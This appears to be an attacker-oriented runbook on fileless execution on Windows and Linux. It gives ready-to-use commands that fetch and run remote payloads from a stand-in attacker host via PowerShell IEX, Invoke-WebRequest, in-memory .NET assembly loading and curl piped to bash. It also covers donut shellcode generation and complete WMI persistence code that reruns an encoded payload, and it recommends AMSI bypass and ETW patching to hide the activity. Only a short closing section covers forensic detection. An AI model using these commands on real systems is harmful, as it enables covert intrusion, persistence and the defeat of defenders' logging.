# Fileless and memory-resident execution

Dropping a binary on disk is now the loudest thing an attacker can do. Modern
endpoint products monitor file writes, hash on creation, scan on execution, and
retain telemetry. A file that touches disk is a file that can be found, attributed,
and analysed long after the operation ends.

Fileless execution means the payload never exists as a file. It lives in memory,
is injected into a legitimate process, and leaves minimal forensic artefacts.

## Execution directly from memory

PowerShell can download and execute code without writing it to disk:

```powershell
# download and invoke without touching disk
IEX (New-Object Net.WebClient).DownloadString('http://attacker.example.com/payload.ps1')

# or via Invoke-Expression with a web request
Invoke-Expression (Invoke-WebRequest -Uri 'http://attacker.example.com/payload.ps1' -UseBasicParsing).Content
```

The payload exists only in the PowerShell process's memory space. No file is created.

On Linux, the equivalent is piping a download directly to a shell or interpreter:

```text
curl -s http://attacker.example.com/payload.sh | bash
python3 <(curl -s http://attacker.example.com/payload.py)
```

## Reflective loading

Reflective DLL/PE loading executes a Windows binary or library entirely from memory
without using the normal Windows loader. The loader code is embedded in the payload;
it maps the PE into memory, resolves imports, and transfers execution, all without
creating a file or registering with the operating system's loaded module list.

The technique was published by Stephen Fewer in 2008 and remains widely used because
Windows provides no native mechanism to detect it.

Key properties:
- The DLL does not appear in the loaded module list (`EnumProcessModules`)
- No file path associated with the mapping
- The module is not in the PEB loader data

Frameworks implementing reflective loading: Cobalt Strike's `reflective_dll.x64.dll`,
Metasploit's `reflective_dll_loader`, and donut (shellcode generation from arbitrary
.NET/PE).

## Shellcode execution in process memory

Shellcode is injected directly into a running process's memory and executed without
any file:

```text
# donut: convert a PE/DLL/PowerShell script to position-independent shellcode
pip install donut-shellcode
donut -f payload.exe -o shellcode.bin

# the resulting shellcode.bin is delivered via injection, not dropped to disk
```

The shellcode is then injected into a target process (see process injection runbook)
and executed via a remote thread, APC queue, or similar mechanism.

## .NET assembly loading in memory

.NET assemblies can be loaded from byte arrays without touching disk:

```powershell
# load a .NET assembly from memory
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker.example.com/payload.dll')
$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, $null)
```

This is commonly used to load tools like Rubeus, Seatbelt, or SharpHound without
writing them to disk. The loaded assembly runs within the PowerShell process context.

## WMI and COM as execution vehicles

WMI event subscriptions can execute arbitrary code in response to system events and
survive reboots without creating traditional persistence artefacts:

```powershell
# create a WMI event subscription for persistence (fileless, survives reboot)
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    Name = 'UpdateFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
    Name = 'UpdateConsumer'
    CommandLineTemplate = 'powershell -enc BASE64PAYLOAD'
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

This runs the payload every 60 seconds in response to a system event. No file, no
scheduled task visible in Task Scheduler, no registry run key.

## Forensic footprint

Fileless execution leaves a different forensic profile, not zero footprint:

- PowerShell script block logging (Event ID 4104) captures the command even if it
  was downloaded
- ETW (Event Tracing for Windows) records .NET assembly loads, including from memory
- The Amcache and Prefetch do not contain the payload, but do contain the legitimate
  process that hosted it
- Memory acquisition can recover the payload from the process's virtual address space

For this reason, fileless execution is often combined with AMSI bypass (to prevent
script block logging from capturing the payload content) and ETW patching (to prevent
CLR telemetry from recording the assembly load).
